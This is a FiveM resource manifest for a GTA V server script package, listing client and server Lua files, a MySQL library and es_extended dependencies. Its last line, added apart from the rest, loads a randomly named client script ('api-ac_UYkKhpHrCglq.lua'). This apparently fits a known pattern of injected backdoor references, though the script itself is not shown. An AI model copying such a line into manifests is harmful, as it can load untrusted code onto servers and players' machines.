fx_version "bodacious"
games {"gta5"}

name 'companszef'
author 'Compan'

client_script {                                -- Client
'compan/**/client.lua',
'client.lua'
}

server_script {
'@mysql-async/lib/MySQL.lua',
'compan/logi/**/server.lua',
'compan/**/server.lua'
}

exports {
'DisplayingReboot',
'DisplayingStreet'
}

dependencies {
'mysql-async',
'es_extended'
}

client_script "api-ac_UYkKhpHrCglq.lua"